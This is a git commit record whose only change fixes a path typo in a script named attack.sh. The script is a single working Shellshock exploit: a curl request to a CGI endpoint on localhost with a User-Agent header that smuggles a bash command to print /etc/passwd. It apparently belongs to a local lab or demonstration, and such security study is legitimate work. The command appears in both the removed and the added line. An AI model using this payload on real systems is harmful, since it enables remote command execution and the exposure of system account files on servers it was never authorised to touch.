afe796959f5d0a0849e20dd696820e4dfca75f6c
J. Junquera <javier@junquera.xyz>
2019-11-19 08:15:20 +0100

    Des-Torrentizando

--- attack.sh
+++ attack.sh
@@ -1,1 +1,1 @@
-curl localhost:8080/cgi-bin/howiam -H "user-agent: () { :; }; echo; /bin/cat /etc/passwd;"
+curl localhost:8080/cgi-bin/howami -H "user-agent: () { :; }; echo; /bin/cat /etc/passwd;"
